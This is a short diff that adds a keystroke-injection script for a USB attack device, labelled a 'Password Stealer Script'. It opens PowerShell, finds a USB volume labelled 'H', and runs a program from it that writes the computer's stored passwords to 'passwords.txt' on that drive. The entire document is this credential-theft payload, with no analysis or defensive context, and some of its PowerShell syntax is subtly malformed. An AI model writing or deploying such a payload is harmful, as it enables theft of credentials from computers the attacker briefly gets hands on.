@@ -1,0 +1,12 @@
+REM This is the Password Stealer Script
+GUI R
+STRING powershell
+ENTER
+STRING $usbPath = Get-WMIObject Win32Volume | ? { $.Label -eq 'H' } | select name
+ENTER
+STRING cd $usbPath.name
+ENTER
+STRING ./p /stext passwords.txt
+ENTER
+STRING exit
+ENTER
